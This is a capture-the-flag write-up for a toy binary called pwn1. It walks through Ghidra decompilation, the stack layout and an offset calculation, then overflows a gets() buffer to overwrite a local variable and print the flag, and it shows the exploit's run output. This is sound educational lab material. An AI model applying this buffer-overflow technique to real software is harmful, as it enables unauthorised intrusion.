# pwn1 Writeup

## Steps:
1. Open in ghidra and analyze
	- Notice the first 2 questions have specific strings required as answers
 ```
  puts("What... is your name?");
  fgets(input,0x2b,_stdin);
  iVar1 = strcmp(input,"Sir Lancelot of Camelot\n"); # First Input
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,_stdin);
  iVar1 = strcmp(input,"To seek the Holy Grail.\n"); # Second Input
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```
Notice another input captured with `gets`, which is a function commonly used for exploits
```
  puts("What... is my secret?");
  gets(input);
  if (secret == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
```

2. Look at the stack variable layout
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     00010780(R), 
                                                                                                   000108df(*)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 secret                                  XREF[2]:     000107b4(W), 
                                                                                                   000108b2(R)  
             undefined1[43]    Stack[-0x43]   input                                   XREF[5]:     000107ed(*), 
                                                                                                   00010803(*), 
                                                                                                   0001084f(*), 
                                                                                                   00010865(*), 
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:000105e6(*), 00010ab8, 
                                                                                          00010b4c(*), 00011ff8(*)  

```
input is at `Stack[-0x43]` and the variable we want to change (renamed to 'secret') is at `Stack[-0x18]`.
`0x43 - 0x18 = 0x2b` which is 43 bytes in decimal. Since we can write any number of bytes to input, we can access and change 'secret'

3. Create a payload overwriting the 43 bytes from 'input' to 'secret' and set 'secret = dea110c8`

4. Send payloads to process

## Solution:
```
$ python3 ex_pwn.py
[+] Starting local process './pwn1': pid 53621
[*] Switching to interactive mode
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}

[*] Got EOF while reading in interactive
$  

```
